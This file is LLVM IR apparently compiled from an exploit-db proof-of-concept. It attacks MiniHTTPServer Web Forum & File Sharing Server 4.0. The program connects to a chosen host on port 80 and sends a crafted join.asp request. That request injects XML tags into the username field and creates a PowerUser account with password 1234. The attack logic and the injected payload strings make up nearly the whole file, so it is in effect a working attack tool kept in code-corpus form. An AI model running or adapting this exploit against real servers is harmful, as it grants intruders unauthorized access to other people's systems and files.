; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2651.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2651.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.ExploitStart = private unnamed_addr constant [84 x i8] c"/join.asp?frmUserID=uniquerandomusername&frmUserPass=pwd1234&frmMailBox=me@blah.net\00", align 16
@__const.main.Exploit = private unnamed_addr constant [90 x i8] c"</Username><Password>1234</Password><Accessright>PowerUser</Accessright><Email>a@here.net\00", align 16
@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [84 x i8] c"\0A=================================================================================\0A\00", align 1
@.str.1 = private unnamed_addr constant [87 x i8] c"0-day MiniHTTPServer Web Forum & File Sharing Server 4.0 Add PowerUser Vulnerability \0A\00", align 1
@.str.2 = private unnamed_addr constant [89 x i8] c"Proof Of Concept Code and Discovery by Greg Linares <GLinares.Code [At] GMail [Dot] Com\0A\00", align 1
@.str.3 = private unnamed_addr constant [63 x i8] c"Exploits: invalid user-input on join.asp Membership Join Page\0A\00", align 1
@.str.4 = private unnamed_addr constant [93 x i8] c"Adds a PowerUser - which has full read/write to Level Medium - Low Shares and Forum Editing\0A\00", align 1
@.str.5 = private unnamed_addr constant [56 x i8] c"and still able to read all files on High Level shares.\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"Reported: Wednesday October 25th 2006\0A\00", align 1
@.str.7 = private unnamed_addr constant [83 x i8] c"=================================================================================\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"usage: %s <IP-addr or hostname> <username to add>\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [36 x i8] c"Error setting up with WinSock v1.1\0A\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"ERROR: Uknown host %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [21 x i8] c"ERROR: Socket Error\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"ERROR: Connect Error\0A\00", align 1
@.str.14 = private unnamed_addr constant [56 x i8] c"Connected to [%s] on port [80], sending overflow....\0A\0A\0A\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"<Username>\00", align 1
@.str.17 = private unnamed_addr constant [18 x i8] c"GET %s HTTP/1.0\0A\0A\00", align 1
@.str.18 = private unnamed_addr constant [77 x i8] c"Exploit Sent to [%s] \0A Login with Username: %s (lowercase) \0A Password: 1234\0A\00", align 1
@.str.19 = private unnamed_addr constant [72 x i8] c"Any Questions/Comments/Concerns ==> GLinares.Code [at] Gmail [dot] com\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [84 x i8], align 16
  %7 = alloca [90 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = bitcast [84 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([84 x i8], [84 x i8]* @__const.main.ExploitStart, i32 0, i32 0), i64 84, i1 false)
  %18 = bitcast [90 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 getelementptr inbounds ([90 x i8], [90 x i8]* @__const.main.Exploit, i32 0, i32 0), i64 90, i1 false)
  %19 = load i32, i32* @MAXBUF, align 4
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %14, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %15, align 8
  %23 = load i32, i32* @MAXBUF, align 4
  %24 = zext i32 %23 to i64
  %25 = alloca i8, i64 %24, align 16
  store i64 %24, i64* %16, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.1, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.2, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.3, i64 0, i64 0))
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.4, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0))
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.7, i64 0, i64 0))
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, 3
  br i1 %35, label %36, label %42

36:                                               ; preds = %2
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0), i8* %39)
  %41 = call i32 @exit(i32 0) #5
  unreachable

42:                                               ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %9, align 8
  %46 = call i32 @MAKEWORD(i32 1, i32 1)
  %47 = call i64 @WSAStartup(i32 %46, i32* %8)
  %48 = icmp slt i64 %47, 0
  br i1 %48, label %49, label %53

49:                                               ; preds = %42
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 @fprintf(i32 %50, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.9, i64 0, i64 0))
  %52 = call i32 @exit(i32 -1) #5
  unreachable

53:                                               ; preds = %42
  %54 = load i8*, i8** %9, align 8
  %55 = call %struct.hostent* @gethostbyname(i8* %54)
  store %struct.hostent* %55, %struct.hostent** %10, align 8
  %56 = load %struct.hostent*, %struct.hostent** %10, align 8
  %57 = icmp eq %struct.hostent* %56, null
  br i1 %57, label %58, label %64

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0), i8* %59)
  %61 = load i8*, i8** %9, align 8
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %61)
  %63 = call i32 @exit(i32 -1) #5
  unreachable

64:                                               ; preds = %53
  %65 = load i32, i32* @AF_INET, align 4
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i32 %65, i32* %66, align 4
  %67 = call i32 @htons(i32 80)
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i32 %67, i32* %68, align 4
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  %70 = load %struct.hostent*, %struct.hostent** %10, align 8
  %71 = getelementptr inbounds %struct.hostent, %struct.hostent* %70, i32 0, i32 0
  %72 = load i64, i64* %71, align 8
  %73 = inttoptr i64 %72 to %struct.in_addr*
  %74 = bitcast %struct.in_addr* %69 to i8*
  %75 = bitcast %struct.in_addr* %73 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %74, i8* align 4 %75, i64 4, i1 false)
  %76 = load i32, i32* @AF_INET, align 4
  %77 = load i32, i32* @SOCK_STREAM, align 4
  %78 = call i32 @socket(i32 %76, i32 %77, i32 0)
  store i32 %78, i32* %11, align 4
  %79 = load i32, i32* @SOCKET_ERROR, align 4
  %80 = icmp eq i32 %78, %79
  br i1 %80, label %81, label %84

81:                                               ; preds = %64
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0))
  %83 = call i32 @exit(i32 -1) #5
  unreachable

84:                                               ; preds = %64
  %85 = load i32, i32* %11, align 4
  %86 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %87 = call i32 @connect(i32 %85, %struct.sockaddr* %86, i32 12)
  %88 = load i32, i32* @SOCKET_ERROR, align 4
  %89 = icmp eq i32 %87, %88
  br i1 %89, label %90, label %96

90:                                               ; preds = %84
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  %92 = load i32, i32* %11, align 4
  %93 = call i32 @closesocket(i32 %92)
  %94 = call i32 (...) @WSACleanup()
  %95 = call i32 @exit(i32 -1) #5
  unreachable

96:                                               ; preds = %84
  %97 = load i8*, i8** %9, align 8
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.14, i64 0, i64 0), i8* %97)
  %99 = call i32 @memset(i8* %25, i32 0, i32 1024)
  %100 = getelementptr inbounds [84 x i8], [84 x i8]* %6, i64 0, i64 0
  %101 = call i32 (i8*, ...) @strcat(i8* %25, i8* %100)
  %102 = call i32 (i8*, ...) @strcat(i8* %25, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  %103 = call i32 (i8*, ...) @strcat(i8* %25, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0))
  %104 = load i8**, i8*** %5, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 2
  %106 = load i8*, i8** %105, align 8
  %107 = call i8* @strlwr(i8* %106)
  %108 = call i32 (i8*, ...) @strcat(i8* %25, i8* %107)
  %109 = getelementptr inbounds [90 x i8], [90 x i8]* %7, i64 0, i64 0
  %110 = call i32 (i8*, ...) @strcat(i8* %25, i8* %109)
  %111 = call i32 @memset(i8* %22, i32 0, i32 1024)
  %112 = call i32 @sprintf(i8* %22, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.17, i64 0, i64 0), i8* %25)
  %113 = load i32, i32* %11, align 4
  %114 = call i32 @strlen(i8* %22)
  %115 = call i32 @send(i32 %113, i8* %22, i32 %114, i32 0)
  %116 = load i8*, i8** %9, align 8
  %117 = load i8**, i8*** %5, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 2
  %119 = load i8*, i8** %118, align 8
  %120 = call i8* @strlwr(i8* %119)
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.18, i64 0, i64 0), i8* %116, i8* %120)
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.19, i64 0, i64 0))
  %123 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  %124 = load i8*, i8** %14, align 8
  call void @llvm.stackrestore(i8* %124)
  %125 = load i32, i32* %3, align 4
  ret i32 %125
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @printf(i8*, ...) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @WSAStartup(i32, i32*) #3

declare dso_local i32 @MAKEWORD(i32, i32) #3

declare dso_local i32 @fprintf(i32, i8*) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #3

declare dso_local i32 @htons(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #3

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #3

declare dso_local i32 @closesocket(i32) #3

declare dso_local i32 @WSACleanup(...) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @strcat(i8*, ...) #3

declare dso_local i8* @strlwr(i8*) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i32 @strlen(i8*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
